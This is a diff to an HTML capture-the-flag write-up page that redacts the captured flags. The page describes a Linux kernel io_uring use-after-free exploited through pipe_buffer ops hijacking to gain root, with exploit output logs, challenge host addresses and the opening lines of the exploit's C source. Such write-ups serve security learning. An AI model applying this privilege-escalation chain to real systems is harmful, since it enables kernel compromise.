@@ -74,7 +74,7 @@
         <p class="masthead-meta">
           <span>Challenge 8 of 15</span>
           <span>Pwn</span>
-          <span class="live">Solved · 100 pts</span>
+          <span class="live">Full writeup</span>
         </p>
       </div>
       <div class="hero-deck">
@@ -84,7 +84,6 @@
           <p class="deck">Use whatever you own.</p>
           <p class="wu-meta">
             <span class="cat cat-pwn">Pwn</span><span class="sep">·</span>
-            <span>100 points</span><span class="sep">·</span>
             <span>4 November 2026</span>
           </p>
         </div>
@@ -97,7 +96,7 @@
       <div class="wu-layout">
         <article class="wu" data-reveal>
           <div class="tldr"><p class="lab">TL;DR</p><p>Linux 7.2.0-rc3 ships an io_uring/kbuf.c bug where <code>io_ring_buffers_peek()</code> does kfree(arg-&gt;iovs) on the array it just filled instead of on the replaced array, while io_uring/net.c only refreshes kmsg-&gt;vec.iovec when a realloc actually happened, leaving a dangling iovec pointer parked in ctx-&gt;netmsg_cache. Reclaiming the freed chunk with a pipe_buffer[] and issuing a second bundled IORING_OP_SEND writes attacker-chosen (iov_base, iov_len) pairs directly over pipe_buffer[0].ops, so <code>close()</code> calls a userland pipe_buf_operations-&gt;release → commit_creds(prepare_kernel_cred(&amp;init_task)) → root, then read the flag off <code>/dev/sda.</code></p></div>
-          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{16cb5f9913feed7e2b3f4883f774d103}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{a7025547abd6d77949f496500e8fef94}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <div class="flagbox"><span class="lab">Captured</span></div>
           <section id="recon"><h2><span class="hn">01</span>Recon</h2><p class="codelabel">What was handed out</p>
 <p>bug-where.tar.gz → bzImage, initramfs.cpio.gz, kernel.config, qemu-hardening.patch, Dockerfile, <code>docker-compose.yml</code>, app-run, <code>hook.sh</code>. Remote is a pwn.red/jail container; each TCP connection spawns a fresh QEMU:</p>
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>qemu-system-x86_64 -m 128M -smp 2 -machine pc-i440fx-11.0,usb=off,vmport=off,acpi=on,smm=off \
@@ -211,8 +210,8 @@ HIT A
 [*] closing
 [*] pwned=1
 [*] uid=0
-[+] FLAG: BHFlagY{16cb5f9913feed7e2b3f4883f774d103}</code></pre></figure>
-<ul class="bullets"><li>tcp.flagyard.com:24301, landed on the first attempt (variant A) → BHFlagY{16cb5f9913feed7e2b3f4883f774d103}</li><li>tcp.flagyard.com:25414, 9 connections (5 boot flakes, 4 reached a shell), attempt 5 hit variant B with kbase=<code>0xffffffff93a00000</code> → BHFlagY{a7025547abd6d77949f496500e8fef94}</li></ul>
+[+] FLAG: BHFlagY{...}</code></pre></figure>
+<ul class="bullets"><li>tcp.flagyard.com:24301, landed on the first attempt (variant A) → BHFlagY{...}</li><li>tcp.flagyard.com:25414, 9 connections (5 boot flakes, 4 reached a shell), attempt 5 hit variant B with kbase=<code>0xffffffff93a00000</code> → BHFlagY{...}</li></ul>
 <p>Key code /* <code>MINI.c</code>, core of the chain (nolibc; 9 KB static, 3176 B gzip+base64) * 425=io_uring_setup 426=io_uring_enter 427=io_uring_register * 53=socketpair 293=pipe2 72=fcntl 16=ioctl 45=recvfrom 3=close 2=open 0=read */ #define NENT 128 #define SIG1 0x0777UL #define SIG2 0x0555UL</p>
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>/* one bundled SEND on the provided-buffer ring */
 static int csend(struct ctx*c,u32 len){
